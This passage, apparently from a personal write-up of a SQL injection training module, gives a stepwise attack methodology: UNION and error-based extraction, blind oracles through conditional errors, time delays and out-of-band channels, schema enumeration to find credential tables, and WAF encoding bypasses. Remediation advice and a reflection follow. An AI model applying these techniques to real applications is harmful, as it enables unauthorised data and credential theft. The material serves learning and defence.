4. If the result is reflected, pursue an in-band `UNION`: determine the column count (`ORDER BY` / `UNION SELECT NULL`), find a string-compatible column, then exfiltrate.
5. If errors are verbose, force a type-conversion error (`CAST` to `int`) to disclose data directly.
6. If nothing is reflected, establish a blind oracle: a conditional page difference, a conditional error (`CASE WHEN ... error`), a time delay (`pg_sleep` / `SLEEP` / `WAITFOR`), or an out-of-band interaction.
7. Enumerate the schema through the data dictionary (`information_schema` or `all_tables`/`all_tab_columns`) to locate credential tables with randomised names.
8. For blind extraction, automate: linear or binary search per character, reading the oracle programmatically.
9. When a WAF blocks keywords, test encoding bypasses appropriate to the context (XML entities, URL encoding).
10. Always URL-encode payloads delivered through cookies to avoid truncation by special characters.

## Remediation Notes

- Use parameterised (prepared) queries for all data placed into SQL statements. This is the single most effective and generally applicable defense.
- Where parameterisation cannot apply (table names, column names, `ORDER BY`), use strict allow-lists of permitted values.
- Never expose database error messages to the client, return generic error pages.
- Apply the principle of least privilege to the database account used by the application, restrict access to system catalogues and views where unnecessary.
- Never store passwords in plaintext; use a strong, salted password hash.
- Do not rely on a WAF as the primary defense; it is a secondary, bypassable control. Decode and normalise input before any filtering.
- Restrict outbound network access (including DNS) from database servers, and disable external entity resolution in XML parsers, to close out-of-band channels.

---

# Final Reflection

This module was a progression in reading signals under increasing constraint. The early labs return data directly, the later ones return nothing at all, and the entire challenge becomes constructing an oracle out of whatever the application still leaks, a message, an error, a few seconds of delay, a DNS query.

The most transferable insight is the separation between *isolating the data* and *reading the answer*. Once that distinction is internalised, every blind variant becomes the same problem with a different output channel, and the apparent jump in difficulty between conditional responses, conditional errors, time delays, and out-of-band exfiltration collapses into a single pattern applied through different media.

The other lasting lesson is practical rather than conceptual: payload transmission and dialect details, a stripped trailing space after `--`, a truncated cookie, a `1/0` that fails Oracle's type checker, a comma that breaks a cookie value, caused far more dead ends than the injection logic itself. Learning to isolate variables, read the *cause* of a failure rather than its mere presence, and build small purpose-built tooling was as valuable as learning the attacks themselves.
